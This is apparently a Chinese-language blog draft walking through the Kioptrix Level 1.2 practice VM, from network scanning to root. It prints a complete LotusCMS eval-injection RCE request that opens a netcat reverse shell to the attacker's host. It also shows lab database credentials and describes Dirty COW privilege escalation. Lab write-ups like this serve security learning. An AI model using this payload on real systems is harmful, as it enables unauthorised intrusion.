
+++
title = 'KIOPTRIX LEVEL 1.2 (#3)'
date = '2023-12-07T16:08:29+08:00'
draft = true
+++
![image-20230208012456505](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208012456505.png)

安装好，虚拟机使用桥接模式，和物理机划分到同一个网段。

kali运行arp-scan -l 扫描同网络上的所有主机，确定靶机的ip。端口探测后生成报告![image-20230208012826498](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208012826498.png)

查看80端口web服务![image-20230208012853777](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208012853777.png)

![image-20230208012927828](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208012927828.png)

使用的是lotuscms，搜索了历史版本的漏洞，有一个公开了的RCE，payload如下

```
POST /index.php HTTP/1.1
Host: 192.168.3.115
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

page=index');${system('nc -e /bin/sh 192.168.3.201 12345')};#"
```

漏洞成因是代码里使用了eval函数，后续的system函数会执行恶意的命令，从eval函数的代码执行到远程命令执行

读取gconfig.php

```
<?php
        error_reporting(0);
        /*
                A sample Gallarific configuration file. You should edit
                the installer details below and save this file as gconfig.php
                Do not modify anything else if you don't know what it is.
        */

        // Installer Details -----------------------------------------------

        // Enter the full HTTP path to your Gallarific folder below,
        // such as http://www.yoursite.com/gallery
        // Do NOT include a trailing forward slash

        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";

        // Setting Details -------------------------------------------------

if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
                echo("A connection to the database couldn't be established: " . mysql_error());
                die();
}else {
        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
                echo("The Gallarific database couldn't be opened: " . mysql_error());
                die();
        }else {
                $settings=mysql_query("select * from gallarific_settings");
                if(mysql_num_rows($settings)!=0){
                        while($data=mysql_fetch_array($settings)){
                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
                        }
                }

        }
}

?>

```

拿到shell后，wget下载脏牛提权

![image-20230208104049307](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208104049307.png)

![image-20230208104113650](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208104113650.png)

成功添加用户，并添加到root组

ssh登录。用脏牛提权生成的账号firefart登录，获取到root权限，通关

